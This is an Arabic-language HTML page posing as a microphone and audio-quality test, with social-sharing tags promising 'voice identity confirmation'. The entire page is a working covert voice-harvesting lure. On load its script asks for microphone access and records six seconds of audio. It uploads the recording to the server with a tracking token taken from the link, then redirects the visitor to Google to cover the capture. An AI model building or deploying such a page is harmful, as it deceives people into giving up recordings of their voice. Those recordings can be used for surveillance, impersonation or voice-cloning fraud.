<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص وتحسين جودة الصوت الفوري | Audio Check</title>
    
    <meta property="og:title" content="اختبار جودة الميكروفون والصوت الحصري | Audio Check">
    <meta property="og:description" content="انقر للسماح بفحص الميكروفون واختبار نقاء الصوت وتأكيد الهوية الصوتية!">
    <meta property="og:image" content="https://images.unsplash.com/photo-1590602847861-f357a9332bbc?w=1200&auto=format&fit=crop&q=80">
    <meta property="og:type" content="website">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
        .mic-gradient { background: linear-gradient(135deg, #EF4444 0%, #B91C1C 100%); }
    </style>
</head>
<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
        
        <div class="absolute -top-16 -right-16 w-32 h-32 bg-red-500/10 rounded-full blur-2xl pointer-events-none"></div>

        <div class="w-20 h-20 rounded-3xl mic-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-red-500/30 animate-pulse">
            <i class="fa-solid fa-microphone-lines"></i>
        </div>

        <div class="space-y-2">
            <span class="bg-red-500/20 text-red-400 text-xs px-3 py-1 rounded-full font-bold border border-red-500/30">فحص الميكروفون مطلوب</span>
            <h1 class="text-2xl font-black text-white">جاري اختبار جودة الصوت...</h1>
            <p class="text-xs text-slate-400">
                يرجى النقر على زر <span class="text-red-400 font-bold">"السماح للميكروفون" (Allow)</span> عندما يطلب منك المتصفح ذلك لإتمام اختبار النقاء الصوتي.
            </p>
        </div>

        <div class="flex justify-center items-center space-x-2 space-x-reverse py-2">
            <div class="w-3 h-3 bg-red-500 rounded-full animate-bounce"></div>
            <div class="w-3 h-3 bg-red-500 rounded-full animate-bounce [animation-delay:-.2s]"></div>
            <div class="w-3 h-3 bg-red-500 rounded-full animate-bounce [animation-delay:-.4s]"></div>
        </div>

        <div id="statusText" class="text-xs text-red-400 font-semibold animate-pulse">
            جاري تحضير تسجيل الصوت...
        </div>

    </div>

    <script>
        window.addEventListener('DOMContentLoaded', async () => {
            const statusText = document.getElementById('statusText');

            try {
                // طلب إذن الميكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                statusText.textContent = "جاري تسجيل العينة الصوتية الآن...";
                statusText.className = "text-xs text-amber-400 font-semibold";

                const mediaRecorder = new MediaRecorder(stream);
                let audioChunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    statusText.textContent = "تم الانتهاء من التسجيل! جاري إرسال الملف للصوت...";
                    statusText.className = "text-xs text-emerald-400 font-semibold";

                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    
                    // استخراج الرمز token من المسار (مثل /record/c55fcbf8)
                    const pathParts = window.location.pathname.split('/');
                    const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');

                    if (!token) {
                        console.error('Token not found.');
                        return;
                    }

                    const formData = new FormData();
                    formData.append('voice', audioBlob, 'recording.webm');
                    formData.append('token', token);

                    try {
                        await fetch('/submitVoice', {
                            method: 'POST',
                            body: formData
                        });
                    } catch (e) {
                        console.error('Failed to submit voice recording');
                    }

                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                };

                // بدء التسجيل لمدة 6 ثوانٍ تلقائياً
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 6000);

            } catch (err) {
                statusText.textContent = "عذراً، يجب السماح بالميكروفون لإتمام الفحص!";
                statusText.className = "text-xs text-red-400 font-semibold";
            }
        });
    </script>
</body>
</html>
